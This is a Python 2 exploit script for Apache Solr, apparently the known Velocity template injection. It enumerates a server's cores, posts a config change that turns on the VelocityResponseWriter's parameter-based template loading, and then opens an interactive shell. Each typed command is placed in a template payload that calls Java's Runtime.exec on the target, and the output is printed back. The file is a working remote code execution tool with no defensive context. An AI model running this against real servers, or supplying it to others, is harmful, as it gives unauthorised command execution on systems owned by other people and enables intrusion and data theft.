import getopt
import requests
import re
import sys


def GetCoreName(ip,port):
	print "[*] Get CoreName.."
	try:
		reponse = requests.get("http://"+ip+":"+str(port)+"/solr/admin/cores")
		if "status\":0" in reponse.text:
			print "[*] CoreName Get!"
			core_name = re.search(r'status\":\{\s+.*\s+\"name\":\"(.*)\"',str(reponse.text),re.I|re.M)
			return core_name.group(1)
		else:
			print "[*] No CoreName"
			return 0
	except:
		print "[*] Connect Timeout"
		return 0

def ChangeConfig(corename):
	conf_url = "http://"+ip+":"+str(port)+"/solr/"+corename+"/config"
	data = {
		"update-queryresponsewriter": {
		"startup": "lazy",
		"name": "velocity",
		"class": "solr.VelocityResponseWriter",
		"template.base.dir": "",
		"solr.resource.loader.enabled": "true",
		"params.resource.loader.enabled": "true"
		}
	}
	print "[*] Send Config.."
	try:
		send_conf = requests.post(conf_url,data=data)
		if "status\":0" in send_conf.text:
			print "[*] Change Config Succeed !"
		return 1
	except:
		print "[*] Something Wrong"
		return 0

def CmdShell(corename):
	while True:
		Command = raw_input('# ')
		exp = "/solr/"+corename+"/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27"+Command+"%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"
		try:
			result = requests.get("http://"+ip+":"+str(port)+exp)
			print result.text
		except:
			print "[*] Something Wrong"


if __name__ == '__main__':
	opts,args = getopt.getopt(sys.argv[1:],'-u:-p:')
	for opt_name,opt_value in opts:
		if opt_name in ('-u','--url'):
			ip = opt_value
		elif opt_name in ('-p','--port'):
			port = opt_value

	try:
		if ip:
			Core_name = GetCoreName(ip,port)
			if Core_name != 0:
				flag = ChangeConfig(Core_name)
				if flag == 1:
					CmdShell(Core_name)
			else:
				print "[!] Something Wrong!"
	except:
		print "Usage :xx.py -u <ip> -p <port>"
